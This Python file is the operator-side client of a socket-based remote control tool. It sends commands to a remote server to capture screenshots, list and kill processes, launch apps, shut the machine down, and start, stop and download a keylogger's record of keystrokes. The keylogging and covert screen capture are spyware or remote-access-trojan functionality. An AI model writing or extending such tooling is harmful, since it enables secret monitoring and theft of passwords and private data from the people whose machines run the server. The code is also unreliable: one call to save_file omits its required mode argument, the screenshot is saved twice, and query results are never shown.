import socket
import os
import time

# Commands
CMD_END_CONNECTION = 'end_connection'
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_KEY_LOGGER = 'keylogger'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'
CMD_PRINT_KEYLOGGER = 'print_keylogger'
CMD_VIEW_APPS = 'view_apps'
CMD_START_APP = 'start_app'

# FLAGS
FLAG_MSG_END = 'MSG_END'
FLAG_FILE_END = 'FILE_END'
FLAG_PROCESSES_END = 'PROCESSES_END'
FLAG_APPS_END = 'APPS_END'

# BUFFER
BUFFER_SIZE = 1024

# PATH
TMP_PATH = os.path.join(os.getcwd(), 'tmp')


class Client:
  def __init__(self):
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.host = ''
    self.port = 0
    self.addr = (self.host, self.port)

  def connect(self):
    self.host = input('Enter host: ')
    self.port = int(input('Enter port: '))
    self.addr = (self.host, self.port)
    is_disconnected = True
    print("[CONNECTING] Connecting to server...")
    start_time = time.time()
    while is_disconnected:
      if time.time() - start_time > 10:
        print("[ERROR] Connection timeout")
        exit()
      try:
          self.socket.connect(self.addr)
          # self.client.settimeout(None)
          is_disconnected = False
          print("[SUCCESS] Connected to server") 
      except ConnectionRefusedError:
          pass
      except ConnectionAbortedError:
          pass
      except ConnectionResetError:
          pass

  # Command Line Interface
  def run(self):
    while True:
      print('''Commands:
      1: Take screenshot
      2: View processes
      3: View apps
      4: Kill process/app
      5: Start app
      6: Start process
      7: Start key logger
      8: Stop key logger
      9: Print key logger
      10: Shutdown
      0: Exit''')
      cmd = input('Enter command: ')
    
      try:
        if cmd == '1':
          self.take_screenshot()
          self.save_file(TMP_PATH, 'screenshot.png')
        elif cmd == '2':
          self.view_processes()
        elif cmd == '3':
          self.view_apps()
        elif cmd == '4':
          pid = input('Enter pid: ')
          self.kill_process(pid)
        elif cmd == '5':
          app_name = input('Enter app name: ')
          self.start_app(app_name)
        elif cmd == '6':
          pass
        elif cmd == '7':
          self.start_keylogger()
        elif cmd == '8':
          self.stop_keylogger()
        elif cmd == '9':
          self.save_keylogger()
        elif cmd == '10':
          self.shutdown()
          break
        elif cmd == '0':
          print("[EXIT] Exiting...")
          break
      except ConnectionResetError:
        print("[ERROR] Connection reset")
        exit()

  def save_file(self, path, file_name, mode):
    start_time = time.time()
    with open(os.path.join(path, file_name), mode) as f:
      while True:
        if time.time() - start_time > 6:
          print("[ERROR] File transfer timeout")
          break
        data = self.socket.recv(BUFFER_SIZE)
        if data == FLAG_FILE_END.encode():
          break
        else:
          f.write(data)

  def recv_msg(self, flag):
    msg = ""
    while True:
      data = self.socket.recv(BUFFER_SIZE)
      if data == flag.encode():
        break
      else:
        msg += data.decode()
    return msg

  def shutdown(self):
    self.socket.send(CMD_SHUTDOWN.encode())
    print("[SHUTDOWN] Disconnected from server")

  def take_screenshot(self):
    self.socket.send(CMD_TAKE_SCREENSHOT.encode())
    self.save_file(TMP_PATH, 'screenshot.png', 'wb')

  def start_keylogger(self):
    self.socket.send(CMD_START_KEYLOGGER.encode())
    msg = self.recv_msg(FLAG_MSG_END)
    return msg

  def stop_keylogger(self):
    self.socket.send(CMD_STOP_KEYLOGGER.encode())
    msg = self.recv_msg(FLAG_MSG_END)
    return msg

  def save_keylogger(self):
    self.socket.send(CMD_PRINT_KEYLOGGER.encode())
    self.save_file(TMP_PATH, 'keylogger.txt', 'wb')
    
  def view_processes(self):
    self.socket.send(CMD_VIEW_PROCESSES.encode())
    processes = self.recv_msg(FLAG_PROCESSES_END)
    return processes
      
  def view_apps(self):
    self.socket.send(CMD_VIEW_APPS.encode())
    apps = self.recv_msg(FLAG_APPS_END)
    return apps

  def kill_process(self, pid):
    if (not pid or not pid.isdigit()):
      print("[ERROR] PID is empty/invalid")
      return "PID is empty/invalid"
    self.socket.send(CMD_KILL_PROCESS.encode())
    time.sleep(0.01)
    self.socket.send(str(pid).encode())
    return "Process/App killed"

  def start_app(self, app_name):
    if (not app_name):
      print("[ERROR] App name is empty")
      return "[ERROR] App name is empty"
    self.socket.send(CMD_START_APP.encode())
    time.sleep(0.01)
    self.socket.send(app_name.encode())
    msg = self.recv_msg(FLAG_MSG_END)
    return msg

  def end_connection(self):
    self.socket.send(CMD_END_CONNECTION.encode())

  
